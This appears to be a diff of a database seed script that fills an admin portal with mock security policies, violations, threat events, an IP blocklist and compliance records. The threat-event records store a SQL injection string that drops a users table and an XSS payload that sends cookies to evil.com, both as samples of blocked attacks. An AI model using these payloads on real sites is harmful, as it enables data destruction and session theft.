@@ -20,6 +20,36 @@ async function main() {
   // Clean existing data (in reverse order of dependencies)
   console.log('🧹 Cleaning existing data...')
 
+  // Clean new admin module data (reverse dependency order)
+  await prisma.webhookDelivery.deleteMany()
+  await prisma.webhookEndpoint.deleteMany()
+  await prisma.incidentUpdate.deleteMany()
+  await prisma.platformIncident.deleteMany()
+  await prisma.integrationInstall.deleteMany()
+  await prisma.integrationApp.deleteMany()
+  await prisma.dataExport.deleteMany()
+  await prisma.legalHold.deleteMany()
+  await prisma.securityViolation.deleteMany()
+  await prisma.securityPolicy.deleteMany()
+  await prisma.complianceAttestation.deleteMany()
+  await prisma.complianceAudit.deleteMany()
+  await prisma.complianceFramework.deleteMany()
+  await prisma.threatEvent.deleteMany()
+  await prisma.iPBlocklist.deleteMany()
+  await prisma.dataRetentionPolicy.deleteMany()
+  await prisma.maintenanceWindow.deleteMany()
+  await prisma.releaseManagement.deleteMany()
+  await prisma.capacityMetric.deleteMany()
+  await prisma.domainVerification.deleteMany()
+  await prisma.enterpriseSSO.deleteMany()
+  await prisma.sCIMIntegration.deleteMany()
+  await prisma.trustedDevice.deleteMany()
+  await prisma.devicePolicy.deleteMany()
+  await prisma.aPIClient.deleteMany()
+  await prisma.analyticsSnapshot.deleteMany()
+  await prisma.customReport.deleteMany()
+  await prisma.broadcastMessage.deleteMany()
+
   // Clean super admin portal data
   await prisma.platformAuditLog.deleteMany()
   await prisma.superAdminSession.deleteMany()
@@ -5141,6 +5171,2740 @@ async function main() {
     }
   })
 
+  // ==================== SECURITY POLICIES ====================
+  console.log('🔒 Creating security policies...')
+
+  const passwordPolicy = await prisma.securityPolicy.create({
+    data: {
+      name: 'Enterprise Password Policy',
+      type: 'PASSWORD',
+      description: 'Strong password requirements for all enterprise users',
+      settings: {
+        minLength: 12,
+        requireUppercase: true,
+        requireLowercase: true,
+        requireNumbers: true,
+        requireSpecialChars: true,
+        maxAge: 90,
+        preventReuse: 12,
+        lockoutThreshold: 5,
+        lockoutDuration: 30
+      },
+      isEnabled: true,
+      scope: 'PLATFORM',
+      priority: 100,
+      enforcementLevel: 'STRICT',
+    }
+  })
+
+  const sessionPolicy = await prisma.securityPolicy.create({
+    data: {
+      name: 'Session Management Policy',
+      type: 'SESSION',
+      description: 'Controls session duration and idle timeout settings',
+      settings: {
+        maxSessionDuration: 24,
+        idleTimeout: 60,
+        singleSessionOnly: false,
+        requireReauthForSensitive: true,
+        sessionExtensionAllowed: true
+      },
+      isEnabled: true,
+      scope: 'PLATFORM',
+      priority: 90,
+      enforcementLevel: 'STANDARD',
+    }
+  })
+
+  const mfaPolicy = await prisma.securityPolicy.create({
+    data: {
+      name: 'Multi-Factor Authentication Policy',
+      type: 'MFA',
+      description: 'MFA requirements for platform access',
+      settings: {
+        required: true,
+        allowedMethods: ['totp', 'sms', 'email', 'webauthn'],
+        gracePeriodDays: 7,
+        rememberDeviceDays: 30,
+        adminMfaRequired: true
+      },
+      isEnabled: true,
+      scope: 'PLATFORM',
+      priority: 95,
+      enforcementLevel: 'STRICT',
+    }
+  })
+
+  const ipAllowlistPolicy = await prisma.securityPolicy.create({
+    data: {
+      name: 'IP Allowlist Policy',
+      type: 'IP_ALLOWLIST',
+      description: 'Restrict access to approved IP ranges',
+      settings: {
+        enabled: true,
+        allowedRanges: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'],
+        allowVPN: true,
+        blockTor: true,
+        geoRestrictions: ['CN', 'RU', 'KP']
+      },
+      isEnabled: true,
+      scope: 'ORGANIZATION',
+      appliedToOrgs: [enterpriseCo.id],
+      priority: 80,
+      enforcementLevel: 'STRICT',
+    }
+  })
+
+  const dataAccessPolicy = await prisma.securityPolicy.create({
+    data: {
+      name: 'Data Access Control Policy',
+      type: 'DATA_ACCESS',
+      description: 'Controls who can access sensitive data',
+      settings: {
+        classificationLevels: ['public', 'internal', 'confidential', 'restricted'],
+        requireApprovalForRestricted: true,
+        auditAllAccess: true,
+        dataExportRestrictions: true,
+        sensitiveFieldMasking: true
+      },
+      isEnabled: true,
+      scope: 'PLATFORM',
+      priority: 85,
+      enforcementLevel: 'STANDARD',
+    }
+  })
+
+  const dlpPolicy = await prisma.securityPolicy.create({
+    data: {
+      name: 'Data Loss Prevention Policy',
+      type: 'DLP',
+      description: 'Prevents unauthorized data exfiltration',
+      settings: {
+        scanOutboundData: true,
+        blockPII: true,
+        blockCreditCards: true,
+        blockSSN: true,
+        alertOnSuspicious: true,
+        maxExportRecords: 10000
+      },
+      isEnabled: true,
+      scope: 'PLATFORM',
+      priority: 88,
+      enforcementLevel: 'STRICT',
+    }
+  })
+
+  const deviceTrustPolicy = await prisma.securityPolicy.create({
+    data: {
+      name: 'Device Trust Policy',
+      type: 'DEVICE_TRUST',
+      description: 'Requirements for trusted devices',
+      settings: {
+        requireDeviceRegistration: true,
+        maxDevicesPerUser: 5,
+        requireEncryption: true,
+        requireScreenLock: true,
+        minOSVersion: { windows: '10', macos: '12', ios: '15', android: '12' },
+        blockJailbroken: true
+      },
+      isEnabled: true,
+      scope: 'ORGANIZATION',
+      appliedToOrgs: [enterpriseCo.id, acmeCorp.id],
+      priority: 75,
+      enforcementLevel: 'STANDARD',
+    }
+  })
+
+  const apiAccessPolicy = await prisma.securityPolicy.create({
+    data: {
+      name: 'API Access Security Policy',
+      type: 'API_ACCESS',
+      description: 'Security controls for API access',
+      settings: {
+        requireApiKey: true,
+        keyRotationDays: 90,
+        rateLimitPerMinute: 1000,
+        requireHttps: true,
+        allowedOrigins: ['*.gwi.com', '*.acme.com'],
+        ipWhitelisting: false
+      },
+      isEnabled: true,
+      scope: 'PLATFORM',
+      priority: 70,
+      enforcementLevel: 'STANDARD',
+    }
+  })
+
+  // ==================== SECURITY VIOLATIONS ====================
+  console.log('⚠️ Creating security violations...')
+
+  await prisma.securityViolation.createMany({
+    data: [
+      {
+        policyId: passwordPolicy.id,
+        orgId: acmeCorp.id,
+        userId: johnDoe.id,
+        violationType: 'WEAK_PASSWORD',
+        severity: 'MEDIUM',
+        status: 'RESOLVED',
+        description: 'User attempted to set password that did not meet complexity requirements',
+        details: { attemptedPassword: '***masked***', failedRules: ['minLength', 'requireSpecialChars'] },
+        detectedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+        resolvedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 300000),
+        resolution: 'User updated password to meet requirements',
+      },
+      {
+        policyId: mfaPolicy.id,
+        orgId: techStartup.id,
+        userId: bobWilson.id,
+        violationType: 'MFA_BYPASS_ATTEMPT',
+        severity: 'HIGH',
+        status: 'INVESTIGATING',
+        description: 'Multiple failed MFA attempts detected from unusual location',
+        details: { attempts: 8, location: 'Unknown VPN', ipAddress: '185.220.101.42' },
+        detectedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
+      },
+      {
+        policyId: ipAllowlistPolicy.id,
+        orgId: enterpriseCo.id,
+        violationType: 'UNAUTHORIZED_IP',
+        severity: 'HIGH',
+        status: 'BLOCKED',
+        description: 'Access attempt from blocked geographic region',
+        details: { sourceIP: '223.5.5.5', country: 'CN', blockedBy: 'geoRestrictions' },
+        detectedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
+        resolution: 'Access automatically blocked by policy',
+      },
+      {
+        policyId: dlpPolicy.id,
+        orgId: acmeCorp.id,
+        userId: janeSmith.id,
+        violationType: 'DATA_EXFILTRATION_ATTEMPT',
+        severity: 'CRITICAL',
+        status: 'ESCALATED',
+        description: 'Attempted export of dataset containing PII exceeding threshold',
+        details: { recordCount: 50000, piiFieldsDetected: ['email', 'phone', 'address'], exportType: 'CSV' },
+        detectedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
+      },
+      {
+        policyId: sessionPolicy.id,
+        orgId: acmeCorp.id,
+        userId: adminUser.id,
+        violationType: 'SESSION_HIJACK_ATTEMPT',
+        severity: 'CRITICAL',
+        status: 'RESOLVED',
+        description: 'Session token used from different IP address than original',
+        details: { originalIP: '192.168.1.100', newIP: '45.33.32.156', userAgent: 'curl/7.64.1' },
+        detectedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
+        resolvedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000 + 600000),
+        resolution: 'Session terminated and user notified',
+      },
+      {
+        policyId: deviceTrustPolicy.id,
+        orgId: enterpriseCo.id,
+        userId: sarahEnterprise.id,
+        violationType: 'UNTRUSTED_DEVICE',
+        severity: 'MEDIUM',
+        status: 'PENDING_REVIEW',
+        description: 'Login attempt from unregistered device',
+        details: { deviceType: 'Android', deviceId: 'unknown', osVersion: '11' },
+        detectedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
+      },
+      {
+        policyId: apiAccessPolicy.id,
+        orgId: techStartup.id,
+        violationType: 'RATE_LIMIT_EXCEEDED',
+        severity: 'LOW',
+        status: 'AUTO_RESOLVED',
+        description: 'API rate limit exceeded by 250%',
+        details: { limit: 1000, actual: 2500, endpoint: '/api/v1/audiences', apiKeyPrefix: 'gwi_live_' },
+        detectedAt: new Date(now.getTime() - 6 * 60 * 60 * 1000),
+        resolvedAt: new Date(now.getTime() - 6 * 60 * 60 * 1000 + 60000),
+        resolution: 'Rate limit enforced, requests throttled',
+      },
+      {
+        policyId: passwordPolicy.id,
+        orgId: enterpriseCo.id,
+        violationType: 'PASSWORD_REUSE',
+        severity: 'MEDIUM',
+        status: 'RESOLVED',
+        description: 'User attempted to reuse a previous password',
+        details: { passwordHistoryMatch: 3 },
+        detectedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
+        resolvedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 120000),
+        resolution: 'User selected new unique password',
+      },
+      {
+        policyId: dataAccessPolicy.id,
+        orgId: acmeCorp.id,
+        userId: johnDoe.id,
+        violationType: 'UNAUTHORIZED_DATA_ACCESS',
+        severity: 'HIGH',
+        status: 'INVESTIGATING',
+        description: 'Attempted access to restricted classification data without approval',
+        details: { datasetId: 'ds_confidential_001', classification: 'restricted', requiredApproval: true },
+        detectedAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
+      },
+      {
+        policyId: mfaPolicy.id,
+        orgId: acmeCorp.id,
+        userId: janeSmith.id,
+        violationType: 'MFA_NOT_ENROLLED',
+        severity: 'MEDIUM',
+        status: 'RESOLVED',
+        description: 'User attempted login without completing MFA enrollment during grace period',
+        details: { gracePeriodExpired: true, enrollmentReminders: 3 },
+        detectedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
+        resolvedAt: new Date(now.getTime() - 13 * 24 * 60 * 60 * 1000),
+        resolution: 'User completed MFA enrollment',
+      },
+      {
+        policyId: sessionPolicy.id,
+        orgId: techStartup.id,
+        userId: bobWilson.id,
+        violationType: 'CONCURRENT_SESSION_LIMIT',
+        severity: 'LOW',
+        status: 'AUTO_RESOLVED',
+        description: 'User exceeded maximum concurrent sessions',
+        details: { maxSessions: 3, activeSessions: 5, oldestSessionTerminated: true },
+        detectedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
+        resolvedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000 + 1000),
+        resolution: 'Oldest sessions automatically terminated',
+      },
+      {
+        policyId: dlpPolicy.id,
+        orgId: enterpriseCo.id,
+        userId: sarahEnterprise.id,
+        violationType: 'SENSITIVE_DATA_IN_EXPORT',
+        severity: 'HIGH',
+        status: 'BLOCKED',
+        description: 'Export blocked due to credit card numbers detected in dataset',
+        details: { creditCardsFound: 145, exportBlocked: true, sanitizedExportOffered: true },
+        detectedAt: new Date(now.getTime() - 8 * 60 * 60 * 1000),
+        resolution: 'Export blocked, user offered sanitized version',
+      },
+      {
+        policyId: ipAllowlistPolicy.id,
+        orgId: enterpriseCo.id,
+        violationType: 'TOR_EXIT_NODE',
+        severity: 'HIGH',
+        status: 'BLOCKED',
+        description: 'Connection attempt from known Tor exit node',
+        details: { sourceIP: '185.220.100.252', isTorExitNode: true },
+        detectedAt: new Date(now.getTime() - 18 * 60 * 60 * 1000),
+        resolution: 'Connection automatically blocked',
+      },
+      {
+        policyId: deviceTrustPolicy.id,
+        orgId: acmeCorp.id,
+        userId: adminUser.id,
+        violationType: 'JAILBROKEN_DEVICE',
+        severity: 'HIGH',
+        status: 'BLOCKED',
+        description: 'Login attempt from jailbroken iOS device',
+        details: { deviceType: 'iPhone', isJailbroken: true, detection: 'Cydia detected' },
+        detectedAt: new Date(now.getTime() - 20 * 60 * 60 * 1000),
+        resolution: 'Access denied, user notified to use compliant device',
+      },
+      {
+        policyId: apiAccessPolicy.id,
+        orgId: acmeCorp.id,
+        violationType: 'INVALID_API_KEY',
+        severity: 'MEDIUM',
+        status: 'LOGGED',
+        description: 'Multiple requests with invalid or expired API key',
+        details: { keyPrefix: 'gwi_test_old_', attempts: 50, timeWindow: '5 minutes' },
+        detectedAt: new Date(now.getTime() - 30 * 60 * 60 * 1000),
+        resolution: 'Requests rejected, key owner notified',
+      },
+    ]
+  })
+
+  // ==================== THREAT EVENTS ====================
+  console.log('🎯 Creating threat events...')
+
+  await prisma.threatEvent.createMany({
+    data: [
+      {
+        type: 'BRUTE_FORCE',
+        severity: 'HIGH',
+        status: 'MITIGATED',
+        sourceIP: '45.33.32.156',
+        targetResource: 'login_endpoint',
+        description: 'Brute force attack detected against login endpoint',
+        details: { attempts: 5000, uniqueUsernames: 150, timeWindow: '1 hour', blocked: true },
+        detectedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
+        mitigatedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 300000),
+        mitigationAction: 'IP blocked for 24 hours, affected accounts locked',
+      },
+      {
+        type: 'PHISHING_ATTEMPT',
+        severity: 'CRITICAL',
+        status: 'INVESTIGATING',
+        targetResource: 'user_accounts',
+        targetOrgId: acmeCorp.id,
+        description: 'Phishing campaign targeting organization users detected',
+        details: { affectedUsers: 12, phishingDomain: 'gwi-login.fake.com', reportedBy: 'user' },
+        detectedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
+      },
+      {
+        type: 'SUSPICIOUS_ACTIVITY',
+        severity: 'MEDIUM',
+        status: 'MONITORING',
+        sourceIP: '103.21.244.0',
+        targetResource: 'api_endpoints',
+        targetOrgId: techStartup.id,
+        description: 'Unusual API access patterns detected',
+        details: { pattern: 'sequential_enumeration', endpoints: ['/users', '/orgs', '/data'], requests: 10000 },
+        detectedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000),
+      },
+      {
+        type: 'CREDENTIAL_STUFFING',
+        severity: 'HIGH',
+        status: 'MITIGATED',
+        sourceIP: '185.220.101.1',
+        targetResource: 'authentication',
+        description: 'Credential stuffing attack using leaked credentials database',
+        details: { totalAttempts: 25000, successfulLogins: 3, leakSource: 'unknown_breach' },
+        detectedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
+        mitigatedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000 + 1800000),
+        mitigationAction: 'Compromised accounts locked, password reset required',
+      },
+      {
+        type: 'SQL_INJECTION',
+        severity: 'CRITICAL',
+        status: 'BLOCKED',
+        sourceIP: '198.51.100.42',
+        targetResource: 'search_api',
+        description: 'SQL injection attempt in search query parameter',
+        details: { payload: "'; DROP TABLE users; --", endpoint: '/api/search', blocked: true },
+        detectedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
+        mitigatedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000 + 100),
+        mitigationAction: 'Request blocked by WAF, IP added to blocklist',
+      },
+      {
+        type: 'XSS_ATTEMPT',
+        severity: 'HIGH',
+        status: 'BLOCKED',
+        sourceIP: '203.0.113.50',
+        targetResource: 'comment_field',
+        description: 'Cross-site scripting attempt in user input field',
+        details: { payload: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>', sanitized: true },
+        detectedAt: new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000),
+        mitigatedAt: new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000 + 50),
+        mitigationAction: 'Input sanitized, attempt logged',
+      },
+      {
+        type: 'DATA_SCRAPING',
+        severity: 'MEDIUM',
+        status: 'MITIGATED',
+        sourceIP: '104.18.32.7',
+        targetResource: 'public_api',
+        targetOrgId: enterpriseCo.id,
+        description: 'Automated data scraping detected via API',
+        details: { requestsPerMinute: 500, dataExtracted: '50MB', duration: '2 hours' },
+        detectedAt: new Date(now.getTime() - 6 * 24 * 60 * 60 * 1000),
+        mitigatedAt: new Date(now.getTime() - 6 * 24 * 60 * 60 * 1000 + 7200000),
+        mitigationAction: 'Rate limiting applied, API key revoked',
+      },
+      {
+        type: 'ACCOUNT_TAKEOVER',
+        severity: 'CRITICAL',
+        status: 'RESOLVED',
+        targetResource: 'user_account',
+        targetOrgId: acmeCorp.id,
+        targetUserId: johnDoe.id,
+        description: 'Successful account takeover detected and reversed',
+        details: { loginLocation: 'Nigeria', normalLocation: 'United States', actionsPerformed: ['password_change', 'email_change'] },
+        detectedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
+        mitigatedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000 + 3600000),
+        mitigationAction: 'Account recovered, all sessions terminated, credentials reset',
+      },
+      {
+        type: 'API_ABUSE',
+        severity: 'MEDIUM',
+        status: 'MONITORING',
+        sourceIP: '172.217.14.110',
+        targetResource: 'reporting_api',
+        description: 'Excessive API usage beyond normal patterns',
+        details: { normalUsage: 100, currentUsage: 5000, increase: '5000%' },
+        detectedAt: new Date(now.getTime() - 8 * 60 * 60 * 1000),
+      },
+      {
+        type: 'INSIDER_THREAT',
+        severity: 'HIGH',
+        status: 'INVESTIGATING',
+        targetResource: 'sensitive_data',
+        targetOrgId: enterpriseCo.id,
+        targetUserId: sarahEnterprise.id,
+        description: 'Unusual data access pattern by privileged user',
+        details: { normalAccessVolume: '10 records/day', currentAccess: '5000 records', dataType: 'customer_pii' },
+        detectedAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
+      },
+      {
+        type: 'MALWARE_DETECTED',
+        severity: 'CRITICAL',
+        status: 'BLOCKED',
+        targetResource: 'file_upload',
+        description: 'Malware detected in uploaded file',
+        details: { fileName: 'report.xlsx.exe', malwareType: 'Trojan.Generic', scanner: 'ClamAV' },
+        detectedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
+        mitigatedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000 + 500),
+        mitigationAction: 'File quarantined, upload rejected',
+      },
+      {
+        type: 'DDOS_ATTACK',
+        severity: 'CRITICAL',
+        status: 'MITIGATED',
+        sourceIP: 'multiple',
+        targetResource: 'platform',
+        description: 'Distributed denial of service attack on platform',
+        details: { peakTraffic: '50 Gbps', duration: '45 minutes', botnetSize: 'estimated 100k nodes' },
+        detectedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
+        mitigatedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000 + 2700000),
+        mitigationAction: 'Traffic rerouted through DDoS protection, attack absorbed',
+      },
+    ]
+  })
+
+  // ==================== IP BLOCKLIST ====================
+  console.log('🚫 Creating IP blocklist...')
+
+  await prisma.iPBlocklist.createMany({
+    data: [
+      {
+        ipAddress: '45.33.32.156',
+        blockType: 'PERMANENT',
+        reason: 'Repeated brute force attacks and credential stuffing attempts',
+        source: 'AUTOMATIC',
+        threatScore: 95,
+        metadata: { attacks: 15, lastAttack: now.toISOString(), country: 'Unknown' },
+      },
+      {
+        ipAddress: '185.220.100.0/24',
+        blockType: 'PERMANENT',
+        reason: 'Known Tor exit node range',
+        source: 'THREAT_INTEL',
+        threatScore: 80,
+        metadata: { category: 'tor_exit_nodes', provider: 'TorProject' },
+      },
+      {
+        ipAddress: '103.21.244.0/24',
+        blockType: 'TEMPORARY',
+        reason: 'Suspicious scanning activity detected',
+        source: 'AUTOMATIC',
+        expiresAt: new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000),
+        threatScore: 65,
+        metadata: { scannedPorts: [22, 80, 443, 3306, 5432], scanDuration: '2 hours' },
+      },
+      {
+        ipAddress: '198.51.100.42',
+        blockType: 'PERMANENT',
+        reason: 'SQL injection attacks',
+        source: 'AUTOMATIC',
+        threatScore: 90,
+        metadata: { attackType: 'sql_injection', attempts: 50 },
+      },
+      {
+        ipAddress: '223.5.5.0/24',
+        blockType: 'GEO_BLOCK',
+        reason: 'Geographic restriction - China',
+        source: 'MANUAL',
+        threatScore: 50,
+        metadata: { country: 'CN', reason: 'compliance_requirement' },
+      },
+      {
+        ipAddress: '203.0.113.50',
+        blockType: 'TEMPORARY',
+        reason: 'XSS attack attempts',
+        source: 'AUTOMATIC',
+        expiresAt: new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000),
+        threatScore: 75,
+        metadata: { attackType: 'xss', blocked: true },
+      },
+      {
+        ipAddress: '104.18.32.0/24',
+        blockType: 'RATE_LIMITED',
+        reason: 'Excessive API requests - possible scraping',
+        source: 'AUTOMATIC',
+        expiresAt: new Date(now.getTime() + 24 * 60 * 60 * 1000),
+        threatScore: 45,
+        metadata: { requestsPerMinute: 500, limit: 100 },
+      },
+    ]
+  })
+
+  // ==================== COMPLIANCE FRAMEWORKS ====================
+  console.log('📋 Creating compliance frameworks...')
+
+  const soc2Framework = await prisma.complianceFramework.create({
+    data: {
+      name: 'SOC 2 Type II',
+      code: 'SOC2',
+      description: 'Service Organization Control 2 - Trust Services Criteria for Security, Availability, and Confidentiality',
+      version: '2017',
+      category: 'SECURITY',
+      requirements: [
+        { id: 'CC1.1', name: 'Control Environment', description: 'Management philosophy and operating style' },
+        { id: 'CC2.1', name: 'Communication and Information', description: 'Quality information and internal communication' },
+        { id: 'CC3.1', name: 'Risk Assessment', description: 'Risk identification and analysis' },
+        { id: 'CC4.1', name: 'Monitoring Activities', description: 'Ongoing evaluations and remediation' },
+        { id: 'CC5.1', name: 'Control Activities', description: 'Policies and procedures' },
+        { id: 'CC6.1', name: 'Logical and Physical Access', description: 'Access control mechanisms' },
+        { id: 'CC7.1', name: 'System Operations', description: 'Infrastructure monitoring and incident management' },
+        { id: 'CC8.1', name: 'Change Management', description: 'Change control procedures' },
+        { id: 'CC9.1', name: 'Risk Mitigation', description: 'Business continuity and disaster recovery' },
+      ],
+      controls: [
+        { id: 'CC6.1.1', requirement: 'CC6.1', name: 'User Access Management', implemented: true },
+        { id: 'CC6.1.2', requirement: 'CC6.1', name: 'MFA Implementation', implemented: true },
+        { id: 'CC7.1.1', requirement: 'CC7.1', name: 'Security Monitoring', implemented: true },
+        { id: 'CC8.1.1', requirement: 'CC8.1', name: 'Change Approval Process', implemented: true },
+      ],
+      isActive: true,
+      effectiveDate: new Date('2024-01-01'),
+    }
+  })
+
+  const hipaaFramework = await prisma.complianceFramework.create({
+    data: {
+      name: 'HIPAA',
+      code: 'HIPAA',
+      description: 'Health Insurance Portability and Accountability Act - Privacy and Security Rules',
+      version: '2013',
+      category: 'PRIVACY',
+      requirements: [
+        { id: '164.308', name: 'Administrative Safeguards', description: 'Security management and workforce security' },
+        { id: '164.310', name: 'Physical Safeguards', description: 'Facility access and device security' },
+        { id: '164.312', name: 'Technical Safeguards', description: 'Access control and audit controls' },
+        { id: '164.314', name: 'Organizational Requirements', description: 'Business associate contracts' },
+        { id: '164.316', name: 'Policies and Procedures', description: 'Documentation requirements' },
+      ],
+      controls: [
+        { id: '164.308.a1', requirement: '164.308', name: 'Risk Analysis', implemented: true },
+        { id: '164.312.a1', requirement: '164.312', name: 'Unique User Identification', implemented: true },
+        { id: '164.312.b', requirement: '164.312', name: 'Audit Controls', implemented: true },
+        { id: '164.312.e1', requirement: '164.312', name: 'Encryption', implemented: true },
+      ],
+      isActive: true,
+      effectiveDate: new Date('2024-01-01'),
+    }
+  })
+
+  const gdprFramework = await prisma.complianceFramework.create({
+    data: {
+      name: 'GDPR',
+      code: 'GDPR',
+      description: 'General Data Protection Regulation - EU Data Protection Law',
+      version: '2018',
+      category: 'PRIVACY',
+      requirements: [
+        { id: 'Art5', name: 'Principles of Processing', description: 'Lawfulness, fairness, transparency' },
+        { id: 'Art6', name: 'Lawful Basis', description: 'Legal grounds for processing' },
+        { id: 'Art7', name: 'Consent', description: 'Conditions for consent' },
+        { id: 'Art12-14', name: 'Transparency', description: 'Information to be provided to data subjects' },
+        { id: 'Art15-22', name: 'Data Subject Rights', description: 'Access, rectification, erasure, portability' },
+        { id: 'Art25', name: 'Data Protection by Design', description: 'Privacy by design and default' },
+        { id: 'Art32', name: 'Security of Processing', description: 'Technical and organizational measures' },
+        { id: 'Art33-34', name: 'Breach Notification', description: 'Data breach notification requirements' },
+      ],
+      controls: [
+        { id: 'Art32.1a', requirement: 'Art32', name: 'Pseudonymization and Encryption', implemented: true },
+        { id: 'Art32.1b', requirement: 'Art32', name: 'Confidentiality and Integrity', implemented: true },
+        { id: 'Art33.1', requirement: 'Art33-34', name: 'Breach Notification Process', implemented: true },
+        { id: 'Art25.1', requirement: 'Art25', name: 'Privacy by Design', implemented: true },
+      ],
+      isActive: true,
+      effectiveDate: new Date('2024-01-01'),
+    }
+  })
+
+  const iso27001Framework = await prisma.complianceFramework.create({
+    data: {
+      name: 'ISO 27001',
+      code: 'ISO27001',
+      description: 'Information Security Management System Standard',
+      version: '2022',
+      category: 'SECURITY',
+      requirements: [
+        { id: 'A.5', name: 'Organizational Controls', description: 'Policies, roles, responsibilities' },
+        { id: 'A.6', name: 'People Controls', description: 'Screening, awareness, responsibilities' },
+        { id: 'A.7', name: 'Physical Controls', description: 'Physical security perimeters and entry' },
+        { id: 'A.8', name: 'Technological Controls', description: 'User endpoints, privileged access, malware' },
+      ],
+      controls: [
+        { id: 'A.5.1', requirement: 'A.5', name: 'Information Security Policy', implemented: true },
+        { id: 'A.8.2', requirement: 'A.8', name: 'Privileged Access Rights', implemented: true },
+        { id: 'A.8.12', requirement: 'A.8', name: 'Data Leakage Prevention', implemented: true },
+        { id: 'A.8.24', requirement: 'A.8', name: 'Use of Cryptography', implemented: true },
+      ],
+      isActive: true,
+      effectiveDate: new Date('2024-01-01'),
+    }
+  })
+
+  const pciDssFramework = await prisma.complianceFramework.create({
+    data: {
+      name: 'PCI DSS',
+      code: 'PCI-DSS',
+      description: 'Payment Card Industry Data Security Standard',
+      version: '4.0',
+      category: 'DATA_SECURITY',
+      requirements: [
+        { id: 'Req1', name: 'Network Security Controls', description: 'Firewall and network security' },
+        { id: 'Req2', name: 'Secure Configurations', description: 'Vendor default security parameters' },
+        { id: 'Req3', name: 'Protect Account Data', description: 'Encryption and protection of stored data' },
+        { id: 'Req4', name: 'Protect Cardholder Data', description: 'Encryption during transmission' },
+        { id: 'Req5', name: 'Anti-Malware', description: 'Protect systems from malware' },
+        { id: 'Req6', name: 'Secure Development', description: 'Secure systems and applications' },
+        { id: 'Req7', name: 'Access Restriction', description: 'Restrict access to need-to-know' },
+        { id: 'Req8', name: 'User Identification', description: 'Identify users and authenticate' },
+        { id: 'Req9', name: 'Physical Access', description: 'Restrict physical access' },
+        { id: 'Req10', name: 'Logging and Monitoring', description: 'Track and monitor access' },
+        { id: 'Req11', name: 'Security Testing', description: 'Test security systems regularly' },
+        { id: 'Req12', name: 'Information Security Policy', description: 'Security policy for personnel' },
+      ],
+      controls: [
+        { id: 'Req3.5.1', requirement: 'Req3', name: 'Encryption Key Management', implemented: true },
+        { id: 'Req8.3.1', requirement: 'Req8', name: 'Multi-Factor Authentication', implemented: true },
+        { id: 'Req10.2', requirement: 'Req10', name: 'Audit Trail Implementation', implemented: true },
+      ],
+      isActive: false,
+      effectiveDate: new Date('2024-03-31'),
+    }
+  })
+
+  // ==================== COMPLIANCE ATTESTATIONS ====================
+  console.log('✅ Creating compliance attestations...')
+
+  await prisma.complianceAttestation.createMany({
+    data: [
+      {
+        frameworkId: soc2Framework.id,
+        orgId: enterpriseCo.id,
+        status: 'CERTIFIED',
+        attestedBy: 'Deloitte & Touche LLP',
+        attestationDate: new Date('2024-06-15'),
+        expiresAt: new Date('2025-06-15'),
+        certificateUrl: 'https://certs.gwi.com/soc2/enterprise-co-2024.pdf',
+        findings: [],
+        scope: { services: ['GWI Platform', 'API Services', 'Data Processing'], locations: ['US', 'EU'] },
+      },
+      {
+        frameworkId: gdprFramework.id,
+        orgId: enterpriseCo.id,
+        status: 'CERTIFIED',
+        attestedBy: 'TrustArc',
+        attestationDate: new Date('2024-03-01'),
+        expiresAt: new Date('2025-03-01'),
+        findings: [],
+        scope: { dataTypes: ['customer_data', 'analytics_data'], regions: ['EU', 'UK'] },
+      },
+      {
+        frameworkId: soc2Framework.id,
+        orgId: acmeCorp.id,
+        status: 'IN_PROGRESS',
+        attestedBy: 'Ernst & Young',
+        findings: [{ type: 'observation', area: 'CC6.1', description: 'MFA enrollment rate below target' }],
+        scope: { services: ['GWI Platform'], locations: ['US'] },
+      },
+      {
+        frameworkId: hipaaFramework.id,
+        orgId: enterpriseCo.id,
+        status: 'PENDING_REVIEW',
+        attestedBy: 'KPMG',
+        findings: [
+          { type: 'finding', area: '164.312', description: 'Encryption key rotation policy needs update', severity: 'medium' },
+        ],
+        scope: { services: ['Healthcare Data Module'], dataTypes: ['PHI'] },
+      },
+      {
+        frameworkId: iso27001Framework.id,
+        orgId: enterpriseCo.id,
+        status: 'CERTIFIED',
+        attestedBy: 'BSI Group',
+        attestationDate: new Date('2024-09-01'),
+        expiresAt: new Date('2027-09-01'),
+        certificateUrl: 'https://certs.gwi.com/iso27001/enterprise-co-2024.pdf',
+        findings: [],
+        scope: { services: ['All Platform Services'], locations: ['Global'] },
+      },
+      {
